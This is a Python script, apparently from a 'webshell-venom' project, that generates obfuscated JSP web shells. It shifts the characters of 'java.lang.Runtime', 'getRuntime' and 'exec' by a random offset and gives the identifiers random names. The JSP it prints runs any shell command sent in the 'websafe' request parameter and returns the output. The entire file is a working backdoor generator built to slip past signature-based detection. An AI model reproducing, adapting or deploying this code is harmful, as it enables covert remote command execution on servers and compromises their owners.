'''
author: yzddmr6
github: https://github.com/yzddmr6/webshell-venom/
pass: websafe
'''
import random

class_str='java.lang.Runtime'
getrt_str='getRuntime'
exec_str='exec'
random_int=random.randint(-14,9)        
shell_form ='''
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!public String {func_name}(String {var1}){{String {var2}="";for (int i = 0; i < {var1}.length(); i++) {{{var2}+=(char)({var1}.charAt(i)+{random_int});}}return {var2};}}
%>
<% String {var3}=request.getParameter("websafe");if({var3}!=null){{ Class {class_name} = Class.forName({func_name}("{payload1}"));
Process {process_name} = (Process) {class_name}.getMethod({func_name}("{payload3}"), String.class).invoke({class_name}.getMethod({func_name}("{payload2}")).invoke(null),{var3});
java.io.InputStream in = {process_name}.getInputStream();byte[] {var4} = new byte[2048];out.print("<pre>");while(in.read({var4})!=-1){{ out.println(new String({var4})); }}out.print("</pre>"); }}
%>
'''

def random_name(len):
    str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   

def gen_payload(func):
    result=''
    for i in func:
        tmp=chr(ord(i)+random_int)
        if(tmp=='\\'):
            tmp='\\\\'
        result+=tmp
    return result

def gen_webshell():
    webshell=shell_form.format(class_name=random_name(4),func_name=random_name(4),process_name=random_name(4),random_int=-random_int,
                                var1=random_name(3),var2=random_name(3),var3=random_name(3),var4=random_name(3),
                                payload1=gen_payload(class_str),payload2=gen_payload(getrt_str),payload3=gen_payload(exec_str))
    print(webshell)

if __name__ == '__main__':
    gen_webshell()
